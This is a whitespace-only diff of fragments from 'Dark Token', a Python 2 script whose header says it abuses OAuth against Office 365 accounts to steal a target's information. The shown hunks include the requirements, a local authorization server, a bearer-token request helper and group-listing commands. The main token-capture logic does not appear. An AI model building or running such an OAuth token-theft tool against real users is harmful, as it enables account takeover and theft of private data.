@@ -1,9 +1,9 @@
 #!/usr/local/bin/python
 
-# Dark Token 
+# Dark Token
 # Written By: Mr. V (Ring0Labs)
 
-# Dark Token, leveraging the open authentication protocol (oauth) to steal target's information. 
+# Dark Token, leveraging the open authentication protocol (oauth) to steal target's information.
 
 ##########################################################################
 # Dark Token                                                             #
@@ -18,15 +18,15 @@
 #                                                                        #
 ##########################################################################
 
-# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; 
-# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
+# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 # See the GNU General Public License for more details.
 
 # Please don't use it for bad things!
 
 """
-Requirements: 
-valid cert.pem, key.pem. 
+Requirements:
+valid cert.pem, key.pem.
 create an app at apps.dev.microsoft.com, platform must be web.
 """
 # https://outlook.office365.com/
@@ -129,7 +129,7 @@ class AuthorizationHandler(BaseHTTPRequestHandler):
 	def do_POST(self):
 		global HTTPD
 		if self.path.startswith('/shutdown'):
-			print '[!] Shutting down Dark Token Server...'	
+			print '[!] Shutting down Dark Token Server...'
 			def stop_server(server):
 				server.shutdown()
 				server.server_close()
@@ -141,7 +141,7 @@ def httpRequest(url, payload, access_token_authorization_bearer=None, method='PO
 
 	if access_token_authorization_bearer:
 		headers['Authorization'] = 'Bearer ' + access_token_authorization_bearer
-	
+
 	url_parsed = urlparse(url)
 
 	conn = httplib.HTTPSConnection(url_parsed.hostname, context=context)
@@ -199,7 +199,7 @@ def get_mygroups(access_token):
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
 	return res_json
-	
+
 def start_server():
 	global HTTPD
 	if not APP_CONFIG['client_id'] or not APP_CONFIG['client_secret'] or not APP_CONFIG['redirect_uri']:
@@ -269,7 +269,7 @@ while True:
 				print colors.allwhite + '-' * int(columns) + colors.end
 				print color.white + str(groups['value'][i])
 		except:
-			print '[!] 0 groups found in the database.' 
+			print '[!] 0 groups found in the database.'
 	elif SIGNAL.__contains__('list my groups'):
 		id = SIGNAL.split()[3]
 		try:
